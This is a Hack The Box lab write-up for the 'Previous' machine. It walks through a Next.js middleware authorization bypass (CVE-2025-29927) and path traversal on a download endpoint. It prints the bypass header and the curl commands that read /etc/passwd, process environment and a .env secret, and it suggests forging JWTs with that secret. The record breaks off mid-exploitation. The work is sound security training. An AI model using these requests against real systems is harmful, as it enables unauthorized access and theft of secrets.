---
title: Previous [Medium]
published: false
date: 2025-08-25
tags: [htb, linux, nmap, nextjs, middleware, cve-2025-29927, lfi, zip, gobuster, terraform]
categories: [HTB Writeups]
author: 2Fa0n
img_path: /assets/img/previous-htb-release-area-machine
image: /assets/img/previous-htb-release-area-machine/previous-htb-release-area-machine_banner.png
---

# Previous HTB Release Area Machine
## Machine information
Author: [brun0ne](https://app.hackthebox.com/users/70197)

## Enumeration
### Nmap
```bash
└─$ sudo nmap -Pn -sC -sV 10.129.xx.xx
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-23 23:38 EDT
Nmap scan report for 10.129.xx.xx
Host is up (0.34s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://previous.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 38.03 seconds
```

Add these to `/etc/hosts` file:
```bash
10.129.xx.xx     previous.htb
```

Let's check the web server.

### Web Enumeration
Go to `http://previous.htb`.

![Previous Website](/assets/img/previous-htb-release-area-machine/previous-htb-release-area-machine_website.png)

Then when we hover to `Contact` we see email.

![Previous Website Contact](/assets/img/previous-htb-release-area-machine/previous-htb-release-area-machine_website-contact.png)

Found out `jeremy@previous.htb`, so if we found any password, we can use this to `ssh` into the machine.

When we click on `Get Started` or `Docs`, we will be redirected to this page.

![Previous Website Get Stared and Docs](/assets/img/previous-htb-release-area-machine/previous-htb-release-area-machine_website-get-started-docs.png)

We got this path `http://previous.htb/api/auth/signin?callbackUrl=%2Fdocs` for latter discovery.

Let's check out the techstack of this website.

![Previous Website Techstack](/assets/img/previous-htb-release-area-machine/previous-htb-release-area-machine_website-techstack.png)

So this website use `Next.js 15.2.2` and then searching for public exploit or related cve. <br>
&rarr; We found out [Next.js Middleware Auth Bypass](https://securitylabs.datadoghq.com/articles/nextjs-middleware-auth-bypass/) and was assigned to `CVE-2025-29927`.

### CVE-2025-29927
Searching for exploit github poc and found out this [exploit-CVE-2025-29927](https://github.com/UNICORDev/exploit-CVE-2025-29927) to help me identify the vulnerability.

```bash
└─$ python3 exploit-CVE-2025-29927.py -u http://previous.htb/ -v 15.2.2 

        _ __,~~~/_        __  ___  _______________  ___  ___
    ,~~`( )_( )-\|       / / / / |/ /  _/ ___/ __ \/ _ \/ _ \
        |/|  `--.       / /_/ /    // // /__/ /_/ / , _/ // /
_V__v___!_!__!_____V____\____/_/|_/___/\___/\____/_/|_/____/....
    
UNICORD: Exploit for CVE-2025-29927 (Next.js) - Authorization Bypass
TARGETS: http://previous.htb/
PREPARE: Target is running Next.js!
VERSION: Targeting Next.js version 15.2.2 (Vulnerable)

PAYLOAD: {'X-Middleware-Subrequest': 'middleware:middleware:middleware:middleware:middleware'}
EXPLOIT: Payload sent!
FAILURE: Authorization bypass header failed.

PAYLOAD: {'X-Middleware-Subrequest': 'src/middleware:src/middleware:src/middleware:src/middleware:src/middleware'}
EXPLOIT: Payload sent!
FAILURE: Authorization bypass header failed.
ERRORED: Exploitation failed! Target may not be vulnerable.
```

So we got problem due to `Authorization failed` and `Exploitation failed` which we though that it will got `SUCCESS`. <br>
&rarr; But if we look back the path we got, if we try to with `http://previous.htb/api/` could it work?

```bash
└─$ python3 exploit-CVE-2025-29927.py -u http://previous.htb/api/ -v 15.2.2

        _ __,~~~/_        __  ___  _______________  ___  ___
    ,~~`( )_( )-\|       / / / / |/ /  _/ ___/ __ \/ _ \/ _ \
        |/|  `--.       / /_/ /    // // /__/ /_/ / , _/ // /
_V__v___!_!__!_____V____\____/_/|_/___/\___/\____/_/|_/____/....
    
UNICORD: Exploit for CVE-2025-29927 (Next.js) - Authorization Bypass
TARGETS: http://previous.htb/api/
PREPARE: Target is running Next.js!
VERSION: Targeting Next.js version 15.2.2 (Vulnerable)

PAYLOAD: {'X-Middleware-Subrequest': 'middleware:middleware:middleware:middleware:middleware'}
EXPLOIT: Payload sent!
SUCCESS: Authorization bypass header found!
OUTPUTS: Response written to file: nextjs_bypass_previous.htb.html
REQUEST: curl -i -k "http://previous.htb/api/" -H "X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware"
```

Noice! We got the `SUCCESS` and we can see the response in the file `nextjs_bypass_previous.htb.html`.

```bash
└─$ cat nextjs_bypass_previous.htb.html 
<!DOCTYPE html><html><head><meta charSet="utf-8" data-next-head=""/><meta name="viewport" content="width=device-width" data-next-head=""/><title data-next-head="">404: This page could not be found</title><link rel="preload" href="/_next/static/css/9a1ff1f4870b5a50.css" as="style"/><link rel="stylesheet" href="/_next/static/css/9a1ff1f4870b5a50.css" data-n-g=""/><noscript data-n-css=""></noscript><script defer="" nomodule="" src="/_next/static/chunks/polyfills-42372ed130431b0a.js"></script><script src="/_next/static/chunks/webpack-cb370083d4f9953f.js" defer=""></script><script src="/_next/static/chunks/framework-ee17a4c43a44d3e2.js" defer=""></script><script src="/_next/static/chunks/main-0221d9991a31a63c.js" defer=""></script><script src="/_next/static/chunks/pages/_app-95f33af851b6322a.js" defer=""></script><script src="/_next/static/chunks/pages/_error-41608b100cc61246.js" defer=""></script><script src="/_next/static/qVDR2cKpRgqCslEh-llk9/_buildManifest.js" defer=""></script><script src="/_next/static/qVDR2cKpRgqCslEh-llk9/_ssgManifest.js" defer=""></script></head><body><div id="__next"><div style="font-family:system-ui,&quot;Segoe UI&quot;,Roboto,Helvetica,Arial,sans-serif,&quot;Apple Color Emoji&quot;,&quot;Segoe UI Emoji&quot;;height:100vh;text-align:center;display:flex;flex-direction:column;align-items:center;justify-content:center"><div style="line-height:48px"><style>body{color:#000;background:#fff;margin:0}.next-error-h1{border-right:1px solid rgba(0,0,0,.3)}@media (prefers-color-scheme:dark){body{color:#fff;background:#000}.next-error-h1{border-right:1px solid rgba(255,255,255,.3)}}</style><h1 class="next-error-h1" style="display:inline-block;margin:0 20px 0 0;padding-right:23px;font-size:24px;font-weight:500;vertical-align:top">404</h1><div style="display:inline-block"><h2 style="font-size:14px;font-weight:400;line-height:28px">This page could not be found<!-- -->.</h2></div></div></div></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"statusCode":404}},"page":"/_error","query":{},"buildId":"qVDR2cKpRgqCslEh-llk9","nextExport":true,"isFallback":false,"gip":true,"scriptLoader":[]}</script></body></html>
```

And we also found out other github poc [CVE-2025-29927-PoC-Exploit](https://github.com/websecnl/CVE-2025-29927-PoC-Exploit) which also quite similar but this one is more detailed.

```bash
└─$ python3 CVE-2025-29927-check.py                                                                                          
Domain (or full URL): http://previous.htb/api/
[+] Full path provided. Testing only endpoint: /api/
[*] Connecting to base URL: http://previous.htb
[*] Total endpoints to test: 1

[>] Testing endpoint: http://previous.htb/api/
[*] Sending baseline request to: http://previous.htb/api/
[*] Testing payload 'pages/_middleware' for: http://previous.htb/api/
[+] For http://previous.htb/signin?callbackUrl=http%3A%2F%2Flocalhost%3A3000%2Fapi with payload 'pages/_middleware': baseline_status=200, test_status=200, vulnerable=False
[*] Testing payload 'middleware' for: http://previous.htb/api/
[+] For http://previous.htb/signin?callbackUrl=http%3A%2F%2Flocalhost%3A3000%2Fapi with payload 'middleware': baseline_status=200, test_status=200, vulnerable=False
[*] Testing payload 'src/middleware' for: http://previous.htb/api/
[+] For http://previous.htb/signin?callbackUrl=http%3A%2F%2Flocalhost%3A3000%2Fapi with payload 'src/middleware': baseline_status=200, test_status=200, vulnerable=False
[*] Testing payload 'middleware:middleware:middleware:middleware:middleware' for: http://previous.htb/api/
[+] For http://previous.htb/signin?callbackUrl=http%3A%2F%2Flocalhost%3A3000%2Fapi with payload 'middleware:middleware:middleware:middleware:middleware': baseline_status=200, test_status=404, vulnerable=True
[*] Testing payload 'src/middleware:src/middleware:src/middleware:src/middleware:src/middleware' for: http://previous.htb/api/
[+] For http://previous.htb/signin?callbackUrl=http%3A%2F%2Flocalhost%3A3000%2Fapi with payload 'src/middleware:src/middleware:src/middleware:src/middleware:src/middleware': baseline_status=200, test_status=200, vulnerable=False

Final Results:
[
  {
    "path": "/api/",
    "payload": "pages/_middleware",
    "baseline_status": 200,
    "test_status": 200,
    "baseline_url": "http://previous.htb/signin?callbackUrl=http%3A%2F%2Flocalhost%3A3000%2Fapi",
    "content_different": false,
    "vulnerable": false
  },
  {
    "path": "/api/",
    "payload": "middleware",
    "baseline_status": 200,
    "test_status": 200,
    "baseline_url": "http://previous.htb/signin?callbackUrl=http%3A%2F%2Flocalhost%3A3000%2Fapi",
    "content_different": false,
    "vulnerable": false
  },
  {
    "path": "/api/",
    "payload": "src/middleware",
    "baseline_status": 200,
    "test_status": 200,
    "baseline_url": "http://previous.htb/signin?callbackUrl=http%3A%2F%2Flocalhost%3A3000%2Fapi",
    "content_different": false,
    "vulnerable": false
  },
  {
    "path": "/api/",
    "payload": "middleware:middleware:middleware:middleware:middleware",
    "baseline_status": 200,
    "test_status": 404,
    "baseline_url": "http://previous.htb/signin?callbackUrl=http%3A%2F%2Flocalhost%3A3000%2Fapi",
    "content_different": true,
    "vulnerable": true
  },
  {
    "path": "/api/",
    "payload": "src/middleware:src/middleware:src/middleware:src/middleware:src/middleware",
    "baseline_status": 200,
    "test_status": 200,
    "baseline_url": "http://previous.htb/signin?callbackUrl=http%3A%2F%2Flocalhost%3A3000%2Fapi",
    "content_different": false,
    "vulnerable": false
  }
]
```

Either worked really well, so we know that we can bypass the login by injesting this Header into the request.

```bash
X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware
```

So now let's fuzzing with this header to see if we can found any other endpoints.

```bash
└─$ gobuster dir -u http://previous.htb/api/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt -H "X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware"
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://previous.htb/api/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/download             (Status: 400) [Size: 28]
Progress: 23986 / 30000 (79.95%)[ERROR] parse "http://previous.htb/api/error\x1f_log": net/url: invalid control character in URL
Progress: 29999 / 30000 (100.00%)
===============================================================
Finished
===============================================================
```

We got `/download` endpoint, let's check it out.

```bash
└─$ curl -i http://previous.htb/api/download -H "X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware"
HTTP/1.1 400 Bad Request
Server: nginx/1.18.0 (Ubuntu)
Date: Sun, 24 Aug 2025 09:41:16 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 28
Connection: keep-alive
ETag: "vpkl9mnjvgs"
Vary: Accept-Encoding

{"error":"Invalid filename"}
```

Seems like we need to have a correct parameter. <br>
&rarr; Let's fuzzing for parameter.

```bash
└─$ gobuster fuzz -u "http://previous.htb/api/download?FUZZ=test.txt" -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -H "X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware" --exclude-length 28
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:              http://previous.htb/api/download?FUZZ=test.txt
[+] Method:           GET
[+] Threads:          10
[+] Wordlist:         /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt
[+] Exclude Length:   28
[+] User Agent:       gobuster/3.6
[+] Timeout:          10s
===============================================================
Starting gobuster in fuzzing mode
===============================================================
Found: [Status=404] [Length=26] [Word=example] http://previous.htb/api/download?example=test.txt

Progress: 6453 / 6454 (99.98%)
===============================================================
Finished
===============================================================
```

So we are up to this part, getting some assumptions that if we can path traversal on this path. <br>
&rarr; Let's check it out to see if we can read `/etc/passwd`.

```bash
└─$ curl -i "http://previous.htb/api/download?example=../../../etc/passwd" -H "X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware"
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Sun, 24 Aug 2025 09:53:48 GMT
Content-Type: application/zip
Content-Length: 787
Connection: keep-alive
Content-Disposition: attachment; filename=../../../etc/passwd
ETag: "41amqg1v4m26j"

root:x:0:0:root:/root:/bin/sh
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
node:x:1000:1000::/home/node:/bin/sh
nextjs:x:1001:65533::/home/nextjs:/sbin/nologin
```

Okay, so we got a good sign from `Local File Inclusion (LFI)`. <br>
&rarr; Now we will check the enviroment variable.

### LFI
```bash
└─$ curl -i "http://previous.htb/api/download?example=../../../proc/self/environ" -H "X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware" --output result.txt
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   216  100   216    0     0    156      0  0:00:01  0:00:01 --:--:--   156

└─$ cat result.txt                                                                                                                                                                        
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Sun, 24 Aug 2025 09:59:27 GMT
Content-Type: application/zip
Content-Length: 216
Connection: keep-alive
Content-Disposition: attachment; filename=../../../proc/self/environ
ETag: "151dqoq1n56jy"

NODE_VERSION=18.20.8HOSTNAME=0.0.0.0YARN_VERSION=1.22.22SHLVL=1PORT=3000HOME=/home/nextjsPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binNEXT_TELEMETRY_DISABLED=1PWD=/appNODE_ENV=production
```

We got some information about the machine. <br>
&rarr; Take a look more from [Next.js Project Structure](https://nextjs.org/docs/app/getting-started/project-structure) and based on experience.

### Discovery
```bash
└─$ curl -i "http://previous.htb/api/download?example=../../../app/.env" -H "X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware"
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Sun, 24 Aug 2025 10:09:29 GMT
Content-Type: application/zip
Content-Length: 49
Connection: keep-alive
Content-Disposition: attachment; filename=../../../app/.env
ETag: "14ro7p5qyfd4v"

NEXTAUTH_SECRET=82a464f1c3509a81d5c973c31a23c61a
```

Found out this `NEXTAUTH_SECRET` which we can use to forge the JWT token.

> *But I do not use this to forge as admin to exploit more so if you can try it out and let me know if it works. =)*

Let's check out `server.js` file.

```bash
└─$ curl -i "http://previous.htb/api/download?example=../../../app/server.js" -H "X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware"
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Sun, 24 Aug 2025 10:26:29 GMT
Content-Type: application/zip
Content-Length: 6009
Connection: keep-alive
Content-Disposition: attachment; filename=../../../app/server.js
ETag: "48xgv9zfn0go1"

const path = require('path')

const dir = path.join(__dirname)

process.env.NODE_ENV = 'production'
process.chdir(__dirname)

const currentPort = parseInt(process.env.PORT, 10) || 3000
const hostname = process.env.HOSTNAME || '0.0.0.0'

let keepAliveTimeout = parseInt(process.env.KEEP_ALIVE_TIMEOUT, 10)
const nextConfig = {"env":{},"eslint":{"ignoreDuringBuilds":false},"typescript":{"ignoreBuildErrors":false,"tsconfigPath":"tsconfig.json"},"distDir":"./.next","cleanDistDir":true,"assetPrefix":"","cacheMaxMemorySize":52428800,"configOrigin":"next.config.mjs","useFileSystemPublicRoutes":true,"generateEtags":true,"pageExtensions":["js","jsx","md","mdx","ts","tsx"],"poweredByHeader":true,"compress":true,"images":{"deviceSizes":[640,750,828,1080,1200,1920,2048,3840],"imageSizes":[16,32,48,64,96,128,256,384],"path":"/_next/image","loader":"default","loaderFile":"","domains":[],"disableStaticImages":false,"minimumCacheTTL":60,"formats":["image/webp"],"dangerouslyAllowSVG":false,"contentSecurityPolicy":"script-src 'none'; frame-src 'none'; sandbox;","contentDispositionType":"attachment","remotePatterns":[],"unoptimized":false},"devIndicators":{"position":"bottom-left"},"onDemandEntries":{"maxInactiveAge":60000,"pagesBufferLength":5},"amp":{"canonicalBase":""},"basePath":"","sassOptions":{},"trailingSlash":false,"i18n":null,"productionBrowserSourceMaps":false,"excludeDefaultMomentLocales":true,"serverRuntimeConfig":{},"publicRuntimeConfig":{},"reactProductionProfiling":false,"reactStrictMode":null,"reactMaxHeadersLength":6000,"httpAgentOptions":{"keepAlive":true},"logging":{},"expireTime":31536000,"staticPageGenerationTimeout":60,"output":"standalone","modularizeImports":{"@mui/icons-material":{"transform":"@mui/icons-material/{{member}}"},"lodash":{"transform":"lodash/{{member}}"}},"outputFileTracingRoot":"/app","experimental":{"allowedDevOrigins":[],"nodeMiddleware":false,"cacheLife":{"default":{"stale":300,"revalidate":900,"expire":4294967294},"seconds":{"stale":0,"revalidate":1,"expire":60},"minutes":{"stale":300,"revalidate":60,"expire":3600},"hours":{"stale":300,"revalidate":3600,"expire":86400},"days":{"stale":300,"revalidate":86400,"expire":604800},"weeks":{"stale":300,"revalidate":604800,"expire":2592000},"max":{"stale":300,"revalidate":2592000,"expire":4294967294}},"cacheHandlers":{},"cssChunking":true,"multiZoneDraftMode":false,"appNavFailHandling":false,"prerenderEarlyExit":true,"serverMinification":true,"serverSourceMaps":false,"linkNoTouchStart":false,"caseSensitiveRoutes":false,"clientSegmentCache":false,"preloadEntriesOnStart":true,"clientRouterFilter":true,"clientRouterFilterRedirects":false,"fetchCacheKeyPrefix":"","middlewarePrefetch":"flexible","optimisticClientCache":true,"manualClientBasePath":false,"cpus":1,"memoryBasedWorkersCount":false,"imgOptConcurrency":null,"imgOptTimeoutInSeconds":7,"imgOptMaxInputPixels":268402689,"imgOptSequentialRead":null,"isrFlushToDisk":true,"workerThreads":false,"optimizeCss":false,"nextScriptWorkers":false,"scrollRestoration":false,"externalDir":false,"disableOptimizedLoading":false,"gzipSize":true,"craCompat":false,"esmExternals":true,"fullySpecified":false,"swcTraceProfiling":false,"forceSwcTransforms":false,"largePageDataBytes":128000,"turbo":{"root":"/app"},"typedRoutes":false,"typedEnv":false,"parallelServerCompiles":false,"parallelServerBuildTraces":false,"ppr":false,"authInterrupts":false,"webpackMemoryOptimizations":false,"optimizeServerReact":true,"useEarlyImport":false,"viewTransition":false,"staleTimes":{"dynamic":0,"static":300},"serverComponentsHmrCache":true,"staticGenerationMaxConcurrency":8,"staticGenerationMinPagesPerWorker":25,"dynamicIO":false,"inlineCss":false,"useCache":false,"optimizePackageImports":["lucide-react","date-fns","lodash-es","ramda","antd","react-bootstrap","ahooks","@ant-design/icons","@headlessui/react","@headlessui-float/react","@heroicons/react/20/solid","@heroicons/react/24/solid","@heroicons/react/24/outline","@visx/visx","@tremor/react","rxjs","@mui/material","@mui/icons-material","recharts","react-use","effect","@effect/schema","@effect/platform","@effect/platform-node","@effect/platform-browser","@effect/platform-bun","@effect/sql","@effect/sql-mssql","@effect/sql-mysql2","@effect/sql-pg","@effect/sql-squlite-node","@effect/sql-squlite-bun","@effect/sql-squlite-wasm","@effect/sql-squlite-react-native","@effect/rpc","@effect/rpc-http","@effect/typeclass","@effect/experimental","@effect/opentelemetry","@material-ui/core","@material-ui/icons","@tabler/icons-react","mui-core","react-icons/ai","react-icons/bi","react-icons/bs","react-icons/cg","react-icons/ci","react-icons/di","react-icons/fa","react-icons/fa6","react-icons/fc","react-icons/fi","react-icons/gi","react-icons/go","react-icons/gr","react-icons/hi","react-icons/hi2","react-icons/im","react-icons/io","react-icons/io5","react-icons/lia","react-icons/lib","react-icons/lu","react-icons/md","react-icons/pi","react-icons/ri","react-icons/rx","react-icons/si","react-icons/sl","react-icons/tb","react-icons/tfi","react-icons/ti","react-icons/vsc","react-icons/wi"],"trustHostHeader":false,"isExperimentalCompile":false},"htmlLimitedBots":"Mediapartners-Google|Slurp|DuckDuckBot|baiduspider|yandex|sogou|bitlybot|tumblr|vkShare|quora link preview|redditbot|ia_archiver|Bingbot|BingPreview|applebot|facebookexternalhit|facebookcatalog|Twitterbot|LinkedInBot|Slackbot|Discordbot|WhatsApp|SkypeUriPreview","bundlePagesRouterDependencies":false,"configFileName":"next.config.mjs"}

process.env.__NEXT_PRIVATE_STANDALONE_CONFIG = JSON.stringify(nextConfig)

require('next')
const { startServer } = require('next/dist/server/lib/start-server')

if (
  Number.isNaN(keepAliveTimeout) ||
  !Number.isFinite(keepAliveTimeout) ||
  keepAliveTimeout < 0
) {
  keepAliveTimeout = undefined
}

startServer({
  dir,
  isDev: false,
  config: nextConfig,
  hostname,
  port: currentPort,
  allowRetry: false,
  keepAliveTimeout,
}).catch((err) => {
  console.error(err);
  process.exit(1);
});
```

Got more details about this `"distDir":"./.next"` so we build, all the complied file will be in this directory. <br>
&rarr; Checking out `routes-manifest.json` to know all the static and dynamic routes that Next.js handle

```bash
└─$ curl -i "http://previous.htb/api/download?example=../../../app/.next/routes-manifest.json" -H "X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware"
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Sun, 24 Aug 2025 10:27:57 GMT
Content-Type: application/zip
Content-Length: 2548
Connection: keep-alive
Content-Disposition: attachment; filename=../../../app/.next/routes-manifest.json
ETag: "9g13nceds96qd"

{
  "version": 3,
  "pages404": true,
  "caseSensitive": false,
  "basePath": "",
  "redirects": [
    {
      "source": "/:path+/",
      "destination": "/:path+",
      "internal": true,
      "statusCode": 308,
      "regex": "^(?:/((?:[^/]+?)(?:/(?:[^/]+?))*))/$"
    }
  ],
  "headers": [],
  "dynamicRoutes": [
    {
      "page": "/api/auth/[...nextauth]",
      "regex": "^/api/auth/(.+?)(?:/)?$",
      "routeKeys": {
        "nxtPnextauth": "nxtPnextauth"
      },
      "namedRegex": "^/api/auth/(?<nxtPnextauth>.+?)(?:/)?$"
    },
    {
      "page": "/docs/[section]",
      "regex": "^/docs/([^/]+?)(?:/)?$",
      "routeKeys": {
        "nxtPsection": "nxtPsection"
      },
      "namedRegex": "^/docs/(?<nxtPsection>[^/]+?)(?:/)?$"
    }
  ],
  "staticRoutes": [
    {
      "page": "/",
      "regex": "^/(?:/)?$",
      "routeKeys": {},
      "namedRegex": "^/(?:/)?$"
    },
    {
      "page": "/docs",
      "regex": "^/docs(?:/)?$",
      "routeKeys": {},
      "namedRegex": "^/docs(?:/)?$"
    },
    {
      "page": "/docs/components/layout",
      "regex": "^/docs/components/layout(?:/)?$",
      "routeKeys": {},
      "namedRegex": "^/docs/components/layout(?:/)?$"
    },
    {
      "page": "/docs/components/sidebar",
      "regex": "^/docs/components/sidebar(?:/)?$",
      "routeKeys": {},
      "namedRegex": "^/docs/components/sidebar(?:/)?$"
    },
    {
      "page": "/docs/content/examples",
      "regex": "^/docs/content/examples(?:/)?$",
      "routeKeys": {},
      "namedRegex": "^/docs/content/examples(?:/)?$"
    },
    {
      "page": "/docs/content/getting-started",
      "regex": "^/docs/content/getting\\-started(?:/)?$",
      "routeKeys": {},
      "namedRegex": "^/docs/content/getting\\-started(?:/)?$"
    },
    {
      "page": "/signin",
      "regex": "^/signin(?:/)?$",
      "routeKeys": {},
      "namedRegex": "^/signin(?:/)?$"
    }
  ],
  "dataRoutes": [],
  "rsc": {
    "header": "RSC",
    "varyHeader": "RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch",
    "prefetchHeader": "Next-Router-Prefetch",
    "didPostponeHeader": "x-nextjs-postponed",
    "contentTypeHeader": "text/x-component",
    "suffix": ".rsc",
    "prefetchSuffix": ".prefetch.rsc",
    "prefetchSegmentHeader": "Next-Router-Segment-Prefetch",
    "prefetchSegmentSuffix": ".segment.rsc",
    "prefetchSegmentDirSuffix": ".segments"
  },
  "rewriteHeaders": {
    "pathHeader": "x-nextjs-rewritten-path",
    "queryHeader": "x-nextjs-rewritten-query"
  },
  "rewrites": []
}
```

We found the auth part but when we try it out.

```bash
└─$ curl -i "http://previous.htb/api/download?example=../../../app/pages/api/auth/%5B...nextauth%5D.js" -H "X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware"
HTTP/1.1 404 Not Found
Server: nginx/1.18.0 (Ubuntu)
Date: Sun, 24 Aug 2025 10:35:03 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 26
Connection: keep-alive
ETag: "c8wflmak5q"
Vary: Accept-Encoding

{"error":"File not found"}
```

Got this error, maybe we need to fuzzing more to find the right path and as we know that all compiled file will be in `.next` directory. <br>
&rarr; Let's fuzzing from `/.next` directory.

```bash
└─$ gobuster dir -u "http://previous.htb/api/download?example=../../../app/.next/" -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt -H "X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware"
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://previous.htb/api/download?example=../../../app/.next/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/static               (Status: 500) [Size: 21]
/server               (Status: 500) [Size: 21]
```

Got 2 dir, we will go with `/server`.

> *We can also got these path from [Next.js build API](https://nextjs.org/docs/13/app/building-your-application/deploying#nextjs-build-api)*

```bash
└─$ gobuster dir -u "http://previous.htb/api/download?example=../../../app/.next/server/" -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt -H "X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware"
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://previous.htb/api/download?example=../../../app/.next/server/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/pages                (Status: 500) [Size: 21]
```

Gonna keep going.

```bash
└─$ gobuster dir -u "http://previous.htb/api/download?example=../../../app/.next/server/pages/" -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt -H "X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware"
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://previous.htb/api/download?example=../../../app/.next/server/pages/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/docs                 (Status: 500) [Size: 21]
/api                  (Status: 500) [Size: 21]
```

So we are there, `/api` back to to `/api/auth/[...nextauth].js` that we can see the auth part.

> *For more information, check out [Next-Auth.js API Route](https://next-auth.js.org/getting-started/example#add-api-route)*

```bash
└─$ curl -i "http://previous.htb/api/download?example=../../../app/.next/server/pages/api/auth/[...nextauth].js" -H "X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware"
curl: (3) bad range specification in URL position 84:
http://previous.htb/api/download?example=../../../app/.next/server/pages/api/auth/[...nextauth].js
                                                                                   ^
```

So we need to encode these two `[` and `]` to make sure what website will not misunderstand that we want the file not the range.

```bash
└─$ curl -i "http://previous.htb/api/download?example=../../../app/.next/server/pages/api/auth/%5B...nextauth%5D.js" -H "X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware"
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Sun, 24 Aug 2025 10:49:18 GMT
Content-Type: application/zip
Content-Length: 1537
Connection: keep-alive
Content-Disposition: attachment; filename=../../../app/.next/server/pages/api/auth/[...nextauth].js
ETag: "ihx6eiwskd47b"

